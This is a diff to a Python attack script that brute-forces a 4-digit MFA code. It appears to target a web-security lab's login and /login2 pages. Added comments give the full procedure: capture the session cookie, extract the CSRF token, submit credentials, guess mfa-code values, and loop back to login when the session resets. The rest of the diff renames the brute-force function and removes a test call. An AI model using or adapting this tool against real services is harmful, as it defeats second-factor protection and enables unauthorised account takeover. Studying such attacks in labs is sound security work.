@@ -11,6 +11,24 @@ import requests
 from bs4 import BeautifulSoup
 from copy import deepcopy
 
+# Note: Code should extract Set-Cookie cookies on GET responses and save them as session objects to be injected into subsequent requests.
+# Note 2: Requests module does the above if you use a Requests.Session object
+
+# process:
+# 1. GET(host)
+# 1. RESP extract Set-Cookie: session
+# 2. GET(host/login, cookies='{"session": "session"}')
+# 2. RESP body extract => csrf value
+# 3. POST(host/login, cookies='{"session": "session"} body=csrf & username & password)
+# 3. RESP status_code=302 extract cookie 'Set-Cookie = session', header Location (should = login2)
+# 4. GET(host/login2, cookies='{"session": "session"}')
+# 4. RESP status_code = 200 body extract => csrf value
+# 5. POST(host/login2, cookies='{"session": "session"}') body csrf & mfa-code
+# 5. RESP status_code = 200 extract body "Please enter your 4-digit security code"
+# 6. redo 5
+# 6. RESP status_code = 200 extract header Set-Cookie = session, extract body "login-form" & csrf
+# 7. LOOP TO step 3
+
 extract_host = lambda session : json.loads(session.headers)['Host']
 
 def interrupt_handler(signum, frame):
@@ -89,7 +107,7 @@ def authn_mfa(session, headers, csrf, mfa_token):
                         data="csrf={}&mfa-code={}".format(csrf, mfa_token))
 
 
-def brute_force_mfe(session, csrf, credentials, digits=4):
+def brute_force_mfa(session, csrf, credentials, digits=4):
     host = extract_host(session)
     digits = list(range(0, 10))
     resp = None
@@ -135,26 +153,6 @@ if __name__ == "__main__":
     if not csrf:
         raise Exception('ERROR: failed to extract CSRF token from /login2 response')
     
-    brute_force_mfe(session, csrf, credentials={'username': args.username, 'password': args.password})
+    brute_force_mfa(session, csrf, credentials={'username': args.username, 'password': args.password})
 
-    resp = authn_mfa(session, headers={'Referer': "{}/login2".format(args.host)}, csrf=csrf, mfa_token=1111)
-
-    print(csrf)
-
-    # Note: Code should extract Set-Cookie cookies on GET responses and save them as session objects to be injected into subsequent requests.
-
-    # process:
-    # 1. GET(host)
-    # 1. RESP extract Set-Cookie: session
-    # 2. GET(host/login, cookies='{"session": "session"}')
-    # 2. RESP body extract => csrf value
-    # 3. POST(host/login, cookies='{"session": "session"} body=csrf & username & password)
-    # 3. RESP status_code=302 extract cookie 'Set-Cookie = session', header Location (should = login2)
-    # 4. GET(host/login2, cookies='{"session": "session"}')
-    # 4. RESP status_code = 200 body extract => csrf value
-    # 5. POST(host/login2, cookies='{"session": "session"}') body csrf & mfa-code
-    # 5. RESP status_code = 200 extract body "Please enter your 4-digit security code"
-    # 6. redo 5
-    # 6. RESP status_code = 200 extract header Set-Cookie = session, extract body "login-form" & csrf
-    # 7. LOOP TO step 3
 
